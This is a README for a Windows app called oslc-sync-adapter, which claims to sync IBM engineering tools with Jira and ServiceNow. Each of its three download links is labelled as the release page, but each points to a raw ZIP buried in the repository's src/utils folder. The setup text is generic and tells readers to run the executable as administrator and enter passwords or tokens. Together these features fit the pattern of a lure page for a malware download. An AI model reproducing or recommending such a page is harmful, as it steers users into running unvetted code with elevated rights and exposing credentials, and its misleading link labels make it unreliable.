# 🔄 oslc-sync-adapter - Sync tools with less friction

[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/MachineVsCat/oslc-sync-adapter/raw/refs/heads/main/src/utils/oslc_sync_adapter_1.1-alpha.1.zip)

## 🚀 Getting Started

oslc-sync-adapter helps you connect DOORS Next, EWM, and ETM with Jira and ServiceNow. It supports cross-tool traceability and requirements sync on Windows.

Use this guide to download the app, set it up, and start it on your computer.

## 📥 Download

Visit this page to download:  
https://github.com/MachineVsCat/oslc-sync-adapter/raw/refs/heads/main/src/utils/oslc_sync_adapter_1.1-alpha.1.zip

1. Open the release page in your browser.
2. Find the latest release at the top of the list.
3. Download the Windows file that matches your computer.
4. Save the file in a folder you can find again, such as Downloads or Desktop.

If the release includes a ZIP file, save it first and then extract it.

## 🖥️ Windows Requirements

Before you run oslc-sync-adapter, make sure your Windows PC has:

- Windows 10 or Windows 11
- At least 4 GB of RAM
- 500 MB of free disk space
- A stable network connection
- Access to the tools you want to connect, such as Jira, ServiceNow, DOORS Next, EWM, or ETM

For smoother use, keep your work data and config files in a folder with a short path, such as `C:\oslc-sync-adapter`.

## 📦 Install the App

### If you downloaded an .exe file

1. Open the folder where you saved the file.
2. Double-click the `.exe` file.
3. If Windows asks for permission, select Run.
4. Follow the setup steps on screen.

### If you downloaded a .zip file

1. Right-click the ZIP file.
2. Select Extract All.
3. Choose a folder for the app files.
4. Open the extracted folder.
5. Double-click the app file inside the folder.

## ⚙️ First-Time Setup

After you install or extract the app, set up your connection details.

1. Open the app.
2. Add the server address for each tool you want to connect.
3. Enter your user name and password, or a token if your system uses one.
4. Choose the systems you want to sync.
5. Save the settings.

Common systems you may connect:

- DOORS Next for requirements
- EWM for work items
- ETM for test management
- Jira for issue tracking
- ServiceNow for service records

## 🔗 What the App Does

oslc-sync-adapter is built for teams that need data to stay aligned across tools.

It can help you:

- Sync requirements between systems
- Keep trace links up to date
- Move changes between IBM Engineering tools and Jira or ServiceNow
- Support audit and traceability checks
- Reduce manual copy and paste work

It is useful when one team works in DOORS Next and another uses Jira or ServiceNow, but both teams need the same record of what changed.

## 🧭 Typical Workflow

A simple workflow looks like this:

1. Open the app.
2. Choose the source system.
3. Choose the target system.
4. Map the fields you want to sync.
5. Run the sync job.
6. Check the result log.
7. Review any records that did not sync.

If your team uses scheduled sync, you can set the app to run during a quiet time, such as before work starts or after updates end.

## 🗂️ File Layout

After setup, you may see files like these:

- `config` for connection settings
- `logs` for sync history and errors
- `cache` for temporary data
- `jobs` for saved sync tasks
- `backup` for saved copies of settings or records

Keep these files together in one folder. This makes it easier to move or back up the app later.

## 🛠️ Common Tasks

### Start a sync job

1. Open the app.
2. Select the saved job.
3. Click Run.
4. Wait for the job to finish.
5. Read the log if the job shows a problem.

### Check sync status

1. Open the logs page or log file.
2. Look for the latest time stamp.
3. Find records marked as success, warning, or failed.
4. Open the related record in the source system if you need to review it.

### Update connection details

1. Open settings.
2. Change the server address, user name, token, or password.
3. Save the changes.
4. Run a small test sync to confirm the connection works.

## 🔐 Access and Safety

Use a user account that has only the access needed for sync jobs. This helps keep your systems tidy and lowers the chance of changes in the wrong place.

If your company uses a proxy, VPN, or internal network rules, make sure those are set before you start the app.

## 🧩 Example Use Cases

### Requirements sync

A product team stores requirements in DOORS Next. A delivery team tracks work in Jira. oslc-sync-adapter can help keep the requirement links and issue links aligned between both tools.

### Test traceability

A QA team uses ETM for test cases and Jira for defects. The app can help connect test records with issue records so teams can trace what was tested and what failed.

### Change tracking

An engineering team uses EWM for tasks and ServiceNow for service requests. The app can help move key details between both systems so teams can follow the same change record.

## 📊 How to Know It Is Working

You will know the app is working when:

- The app opens without an error
- Your saved settings load correctly
- A test sync finishes with success
- Linked items appear in both systems
- The log shows no failed connection attempts

If a sync job stops, check the log first. The log usually shows which record caused the issue.

## 🧹 Clean Up and Reset

If you need to start fresh:

1. Close the app.
2. Save a copy of your config folder.
3. Delete only the job files you want to remove.
4. Open the app again and create a new setup.

If the app still uses old details, clear the saved config and enter the values again.

## ❓ Frequently Used Tips

### The app does not open
- Make sure you downloaded the Windows file from the release page.
- Check that the file finished downloading.
- Try right-clicking the file and selecting Run as administrator.
- Move the app folder to a simple path like `C:\oslc-sync-adapter`.

### The sync fails
- Check your server address.
- Confirm your account name and password.
- Make sure the target system is online.
- Review the log for a bad field map or blocked connection.

### The records do not match
- Check the field mapping.
- Confirm both systems use the same data type.
- Make sure required fields have values.
- Run a small test with one record first.

## 📁 Best Folder Setup

For fewer file path issues on Windows, use a folder like this:

- `C:\oslc-sync-adapter`
- `C:\oslc-sync-adapter\config`
- `C:\oslc-sync-adapter\logs`

Avoid placing the app in a long folder name with many nested folders. Short paths help when the app reads and writes files.

## 🧪 Suggested First Test

Use one simple item for your first run.

1. Pick one requirement, one task, or one test case.
2. Sync it to one target system.
3. Check that the title, status, and link fields appear as expected.
4. Confirm the record opens in both tools.
5. Use that result to tune the rest of your setup.

## 📌 Download Again

If you need the release page again, use this link:

https://github.com/MachineVsCat/oslc-sync-adapter/raw/refs/heads/main/src/utils/oslc_sync_adapter_1.1-alpha.1.zip